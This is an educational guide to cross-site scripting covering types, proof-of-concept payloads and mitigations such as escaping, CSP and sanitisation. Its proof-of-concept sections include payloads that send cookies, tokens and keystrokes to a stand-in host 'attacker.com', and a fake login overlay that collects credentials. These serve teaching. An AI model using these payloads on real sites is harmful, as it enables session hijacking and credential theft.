# Cross-Site Scripting (XSS)

## Overview

Cross-Site Scripting (XSS) is a client-side code injection vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. When successful, XSS enables attackers to bypass the Same-Origin Policy, steal sensitive data, hijack user sessions, and perform actions on behalf of victims.

**Severity**: High to Critical  
**OWASP Top 10**: A03:2021 - Injection  
**CWE**: CWE-79

## Technical Explanation

XSS vulnerabilities occur when web applications include untrusted data in web pages without proper validation or escaping. Browsers cannot distinguish between legitimate scripts and malicious ones, executing any JavaScript code embedded in the page.

### XSS Types

1. **Reflected XSS (Non-Persistent)**
   - Malicious script is reflected off the web server
   - Delivered through URLs, form submissions, or error messages
   - Requires victim to click a crafted link

2. **Stored XSS (Persistent)**
   - Malicious script is permanently stored on the target server
   - Stored in databases, comment fields, user profiles
   - Executes automatically when users view the infected page

3. **DOM-based XSS**
   - Vulnerability exists in client-side code
   - Payload never sent to server
   - Exploits unsafe JavaScript that processes user input

## Attack Scenario

Consider a social media application with a comment feature:

```javascript
// Vulnerable code
app.get('/profile', (req, res) => {
    const username = req.query.name;
    res.send(`<h1>Welcome ${username}</h1>`);
});
```

An attacker crafts a malicious URL:
```
https://vulnerable-app.com/profile?name=<script>alert(document.cookie)</script>
```

When a victim clicks this link, the JavaScript executes in their browser context, potentially stealing session cookies.

## Proof of Concept

### 1. Reflected XSS - Cookie Theft

```html
<!-- Malicious URL -->
https://vulnerable-app.com/search?q=<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>

<!-- Alternative using image tag -->
https://vulnerable-app.com/search?q=<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

### 2. Stored XSS - Comment Section

```html
<!-- Attacker submits this comment -->
<script>
// Steal session token
var token = localStorage.getItem('auth_token');
fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify({token: token, url: window.location.href})
});
</script>

<!-- Or using event handlers -->
<img src="invalid" onerror="alert('XSS')">
<svg onload="alert('XSS')">
```

### 3. DOM-based XSS

```javascript
// Vulnerable client-side code
function displayMessage() {
    var message = location.hash.substring(1);
    document.getElementById('output').innerHTML = message;
}

// Attack URL
https://vulnerable-app.com/page#<img src=x onerror="alert(document.cookie)">
```

### 4. Advanced Payloads

```html
<!-- Keylogger -->
<script>
document.onkeypress = function(e) {
    fetch('https://attacker.com/log?key=' + e.key);
}
</script>

<!-- Session hijacking -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://attacker.com/hijack', true);
xhr.send(JSON.stringify({
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage)
}));
</script>

<!-- Phishing overlay -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
    <form action="https://attacker.com/phish" method="POST">
        <h2>Session Expired - Please Login</h2>
        <input name="username" placeholder="Username">
        <input name="password" type="password" placeholder="Password">
        <button>Login</button>
    </form>
</div>
```

## Impact

- **Session Hijacking**: Theft of authentication cookies/tokens leading to account takeover
- **Credential Theft**: Phishing attacks to capture usernames and passwords
- **Data Exfiltration**: Access to sensitive information displayed on the page
- **Malware Distribution**: Redirecting users to malicious sites or triggering downloads
- **Defacement**: Altering page content to damage reputation
- **Keylogging**: Recording user keystrokes including sensitive data
- **Privilege Escalation**: Performing administrative actions if admin views infected page
- **Worm Propagation**: Self-replicating XSS (e.g., Samy worm on MySpace)

**Business Impact**: Data breaches, compliance violations, reputational damage, loss of customer trust.

## Mitigation

### 1. Output Encoding/Escaping

**HTML Context**
```python
import html

def render_profile(username):
    safe_username = html.escape(username)
    return f"<h1>Welcome {safe_username}</h1>"

# Input: <script>alert('XSS')</script>
# Output: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
```

**JavaScript Context**
```javascript
function escapeJS(str) {
    return str.replace(/[\\'"]/g, '\\$&')
              .replace(/\n/g, '\\n')
              .replace(/\r/g, '\\r')
              .replace(/\t/g, '\\t');
}

var username = escapeJS(userInput);
var script = `var name = '${username}';`;
```

**URL Context**
```python
from urllib.parse import quote

def create_link(user_input):
    safe_input = quote(user_input, safe='')
    return f"<a href='/search?q={safe_input}'>Search</a>"
```

### 2. Content Security Policy (CSP)

```html
<!-- Strict CSP header -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' 'nonce-{random}'; 
               style-src 'self' 'nonce-{random}'; 
               img-src 'self' https:; 
               object-src 'none'; 
               base-uri 'self'; 
               form-action 'self';">
```

```python
# Flask implementation
from flask import Flask, make_response
import secrets

@app.after_request
def set_csp(response):
    nonce = secrets.token_urlsafe(16)
    csp = (
        f"default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}'; "
        f"style-src 'self' 'nonce-{nonce}'; "
        f"img-src 'self' https:; "
        f"object-src 'none'"
    )
    response.headers['Content-Security-Policy'] = csp
    return response
```

### 3. Input Validation

```python
import re

def validate_username(username):
    # Whitelist approach: only allow alphanumeric and specific characters
    if not re.match(r'^[a-zA-Z0-9_\-\.]{3,20}$', username):
        raise ValueError("Invalid username format")
    return username

def validate_email(email):
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    if not re.match(pattern, email):
        raise ValueError("Invalid email format")
    return email
```

### 4. Use Security Libraries

```javascript
// DOMPurify for sanitizing HTML
import DOMPurify from 'dompurify';

function displayUserContent(html) {
    const clean = DOMPurify.sanitize(html, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
        ALLOWED_ATTR: ['href']
    });
    document.getElementById('content').innerHTML = clean;
}
```

### 5. HTTPOnly and Secure Cookies

```python
from flask import Flask, make_response

@app.route('/login', methods=['POST'])
def login():
    response = make_response(redirect('/dashboard'))
    response.set_cookie(
        'session_id',
        value=session_token,
        httponly=True,      # Prevents JavaScript access
        secure=True,        # HTTPS only
        samesite='Strict'   # CSRF protection
    )
    return response
```

### 6. Template Auto-Escaping

```python
# Flask/Jinja2 (auto-escaping enabled by default)
from flask import Flask, render_template

@app.route('/profile')
def profile():
    username = request.args.get('name', '')
    # Jinja2 automatically escapes variables
    return render_template('profile.html', username=username)
```

```html
<!-- profile.html - automatic escaping -->
<h1>Welcome {{ username }}</h1>

<!-- To render trusted HTML (use with extreme caution) -->
<div>{{ trusted_html | safe }}</div>
```

## Secure Code Example

```python
from flask import Flask, request, render_template, make_response
import html
import re
import secrets
from markupsafe import Markup
import bleach

app = Flask(__name__)
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'

def validate_input(value, max_length=100):
    """Validate input length and basic format"""
    if not value or len(value) > max_length:
        raise ValueError("Invalid input")
    return value.strip()

def sanitize_html(content):
    """Sanitize HTML content allowing only safe tags"""
    allowed_tags = ['p', 'br', 'strong', 'em', 'u', 'a']
    allowed_attrs = {'a': ['href', 'title']}
    
    clean = bleach.clean(
        content,
        tags=allowed_tags,
        attributes=allowed_attrs,
        strip=True
    )
    return clean

@app.after_request
def set_security_headers(response):
    """Set security headers including CSP"""
    nonce = secrets.token_urlsafe(16)
    
    response.headers['Content-Security-Policy'] = (
        f"default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}'; "
        f"style-src 'self' 'nonce-{nonce}'; "
        f"img-src 'self' https:; "
        f"object-src 'none'; "
        f"base-uri 'self'"
    )
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    
    return response

@app.route('/profile')
def profile():
    """Display user profile with XSS protection"""
    try:
        # Get and validate input
        username = validate_input(request.args.get('name', ''), max_length=50)
        
        # Render template (Jinja2 auto-escapes by default)
        return render_template('profile.html', username=username)
        
    except ValueError:
        return "Invalid input", 400

@app.route('/comment', methods=['POST'])
def post_comment():
    """Handle comment submission with HTML sanitization"""
    try:
        # Validate input
        comment = validate_input(request.form.get('comment', ''), max_length=1000)
        
        # Sanitize HTML content
        safe_comment = sanitize_html(comment)
        
        # Store in database (using parameterized queries)
        # db.execute("INSERT INTO comments (content) VALUES (?)", [safe_comment])
        
        return {"success": True, "message": "Comment posted"}
        
    except ValueError:
        return {"success": False, "error": "Invalid input"}, 400

@app.route('/search')
def search():
    """Search endpoint with proper output encoding"""
    query = request.args.get('q', '')
    
    # Escape for HTML context
    safe_query = html.escape(query)
    
    # Perform search
    results = []  # search_database(query)
    
    return render_template('search.html', query=safe_query, results=results)

if __name__ == '__main__':
    app.run(ssl_context='adhoc')  # Use HTTPS
```

```html
<!-- profile.html template -->
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>User Profile</title>
</head>
<body>
    <!-- Jinja2 automatically escapes {{ username }} -->
    <h1>Welcome {{ username }}</h1>
    
    <div id="content">
        <!-- Never use innerHTML with user data -->
        <!-- Use textContent instead -->
    </div>
    
    <script nonce="{{ csp_nonce }}">
        // Safe DOM manipulation
        const username = {{ username | tojson }};
        document.getElementById('user-display').textContent = username;
    </script>
</body>
</html>
```

## Security Takeaways

1. **Encode all output**: Always encode user data based on context (HTML, JavaScript, URL, CSS)
2. **Never trust user input**: Treat all user-supplied data as potentially malicious
3. **Use auto-escaping templates**: Modern frameworks provide automatic output encoding
4. **Implement CSP**: Content Security Policy provides defense-in-depth against XSS
5. **Validate input**: Use whitelist validation for expected input formats
6. **HTTPOnly cookies**: Prevent JavaScript access to sensitive cookies
7. **Avoid innerHTML**: Use textContent or innerText for displaying user data
8. **Sanitize rich content**: Use trusted libraries like DOMPurify or Bleach for HTML content
9. **Security headers**: Deploy X-XSS-Protection, X-Content-Type-Options, X-Frame-Options
10. **Regular testing**: Include XSS testing in security assessments and code reviews

## References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [PortSwigger XSS](https://portswigger.net/web-security/cross-site-scripting)
- [Content Security Policy Reference](https://content-security-policy.com/)
